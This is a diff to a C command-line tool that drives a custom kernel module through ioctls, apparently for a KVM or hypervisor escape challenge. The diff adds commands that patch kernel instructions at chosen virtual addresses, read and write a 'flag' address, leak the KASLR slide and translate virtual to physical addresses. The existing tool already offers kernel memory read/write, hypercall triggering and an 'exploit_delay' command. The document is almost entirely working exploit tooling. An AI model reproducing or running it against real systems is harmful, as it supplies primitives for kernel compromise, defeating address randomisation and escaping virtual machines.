@@ -37,27 +37,22 @@ struct kvm_kernel_mem_read {
     unsigned long length;
     unsigned char *user_buf;
 };
+
 struct kvm_kernel_mem_write {
     unsigned long kernel_addr;
     unsigned long length;
     unsigned char *user_buf;
 };
 
-// ---- PATCH: VA SCAN/WRITE ----
-#define IOCTL_SCAN_VA   0x1010
-#define IOCTL_WRITE_VA  0x1011
+// VA scan structure
+#define IOCTL_SCAN_VA           0x1010
 struct va_scan_data {
     unsigned long va;
     unsigned long size;
     unsigned char *user_buffer;
 };
-struct va_write_data {
-    unsigned long va;
-    unsigned long size;
-    unsigned char *user_buffer;
-};
-// ---- END PATCH ----
 
+// IOCTL commands (updated to match kernel module)
 #define IOCTL_READ_PORT         0x1001
 #define IOCTL_WRITE_PORT        0x1002
 #define IOCTL_READ_MMIO         0x1003
@@ -68,6 +63,11 @@ struct va_write_data {
 #define IOCTL_TRIGGER_HYPERCALL 0x1008
 #define IOCTL_READ_KERNEL_MEM   0x1009
 #define IOCTL_WRITE_KERNEL_MEM  0x100A
+#define IOCTL_PATCH_INSTRUCTIONS 0x100B
+#define IOCTL_READ_FLAG_ADDR    0x100C
+#define IOCTL_WRITE_FLAG_ADDR   0x100D
+#define IOCTL_GET_KASLR_SLIDE   0x100E
+#define IOCTL_VIRT_TO_PHYS      0x100F
 
 void print_usage(char *prog_name) {
     fprintf(stderr, "Usage: %s <command> [args...]\n", prog_name);
@@ -87,7 +87,12 @@ void print_usage(char *prog_name) {
     fprintf(stderr, "  exploit_delay <nanoseconds>\n");
     fprintf(stderr, "  scanmmio <start_addr_hex> <end_addr_hex> <step_bytes>\n");
     fprintf(stderr, "  scanva <va_hex> <num_bytes>\n");
-    fprintf(stderr, "  writeva <va_hex> <hex_string_to_write>\n");
+    fprintf(stderr, "  scaninstr <va_hex> <num_bytes>\n");
+    fprintf(stderr, "  patchinstr <va_hex> <hex_string_to_write>\n");
+    fprintf(stderr, "  readflag\n");
+    fprintf(stderr, "  writeflag <value_hex>\n");
+    fprintf(stderr, "  getkaslr\n");
+    fprintf(stderr, "  virt2phys <virt_addr_hex>\n");
 }
 
 unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes) {
@@ -359,7 +364,6 @@ int main(int argc, char *argv[]) {
         }
         free(buf);
 
-    // ---- PATCH: VA SCAN/WRITE ----
     } else if (strcmp(cmd, "scanva") == 0) {
         if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
         struct va_scan_data req = {0};
@@ -394,25 +398,98 @@ int main(int argc, char *argv[]) {
         }
         free(req.user_buffer);
 
-    } else if (strcmp(cmd, "writeva") == 0) {
+    } else if (strcmp(cmd, "scaninstr") == 0) {
         if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
-        struct va_write_data req = {0};
+        struct va_scan_data req = {0};
         req.va = strtoul(argv[2], NULL, 16);
-        unsigned long nbytes;
+        req.size = strtoul(argv[3], NULL, 10);
+        if (req.size == 0) {
+            fprintf(stderr, "Invalid size for scaninstr (must be >0).\n");
+            close(fd);
+            return 1;
+        }
+        req.user_buffer = malloc(req.size);
+        if (!req.user_buffer) {
+            perror("malloc for scaninstr buffer");
+            close(fd);
+            return 1;
+        }
+        if (ioctl(fd, IOCTL_SCAN_VA, &req) < 0) {
+            perror("ioctl IOCTL_SCAN_VA failed");
+        } else {
+            printf("Kernel VA @ 0x%lX:\n", req.va);
+            for (unsigned long i = 0; i < req.size; ++i) {
+                printf("%02X", req.user_buffer[i]);
+                if ((i+1) % 16 == 0) printf(" ");
+            }
+            printf("\n[ASCII]:\n");
+            for (unsigned long i = 0; i < req.size; ++i) {
+                unsigned char c = req.user_buffer[i];
+                printf("%c", (c >= 32 && c <= 126) ? c : '.');
+                if ((i+1) % 16 == 0) printf(" ");
+            }
+            printf("\n");
+        }
+        free(req.user_buffer);
+
+    } else if (strcmp(cmd, "patchinstr") == 0) {
+        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
+        struct va_scan_data req = {0};
+        req.va = strtoul(argv[2], NULL, 16);
+        unsigned long nbytes = 0;
         req.user_buffer = hex_string_to_bytes(argv[3], &nbytes);
         req.size = nbytes;
         if (!req.user_buffer || req.size == 0) {
-            fprintf(stderr, "Failed to parse hex string for writeva\n");
+            fprintf(stderr, "Failed to parse hex string for patchinstr\n");
             if (req.user_buffer) free(req.user_buffer);
-            close(fd); return 1;
+            close(fd);
+            return 1;
         }
-        if (ioctl(fd, IOCTL_WRITE_VA, &req) < 0)
-            perror("ioctl IOCTL_WRITE_VA failed");
-        else
-            printf("Wrote %lu bytes to VA 0x%lx.\n", req.size, req.va);
+        if (ioctl(fd, IOCTL_PATCH_INSTRUCTIONS, &req) < 0) {
+            perror("ioctl IOCTL_PATCH_INSTRUCTIONS failed");
+        } else {
+            printf("Patched %lu bytes at VA 0x%lx\n", nbytes, req.va);
+        }
         free(req.user_buffer);
 
-    // ---- END PATCH ----
+    } else if (strcmp(cmd, "readflag") == 0) {
+        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
+        unsigned long value;
+        if (ioctl(fd, IOCTL_READ_FLAG_ADDR, &value) < 0) {
+            perror("ioctl READ_FLAG_ADDR failed");
+        } else {
+            printf("Flag value: 0x%lx\n", value);
+        }
+
+    } else if (strcmp(cmd, "writeflag") == 0) {
+        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
+        unsigned long value = strtoul(argv[2], NULL, 16);
+        if (ioctl(fd, IOCTL_WRITE_FLAG_ADDR, &value) < 0) {
+            perror("ioctl WRITE_FLAG_ADDR failed");
+        } else {
+            printf("Wrote 0x%lx to flag address\n", value);
+        }
+
+    } else if (strcmp(cmd, "getkaslr") == 0) {
+        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
+        unsigned long slide;
+        if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) < 0) {
+            perror("ioctl GET_KASLR_SLIDE failed");
+        } else {
+            printf("KASLR slide: 0x%lx\n", slide);
+        }
+
+    } else if (strcmp(cmd, "virt2phys") == 0) {
+        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
+        unsigned long virt = strtoul(argv[2], NULL, 16);
+        unsigned long phys;
+        if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &virt) < 0) {
+            perror("ioctl VIRT_TO_PHYS failed");
+        } else {
+            phys = virt;
+            printf("Virtual 0x%lx -> Physical 0x%lx\n",
+                   strtoul(argv[2], NULL, 16), phys);
+        }
 
     } else {
         fprintf(stderr, "Unknown command: %s\n", cmd);
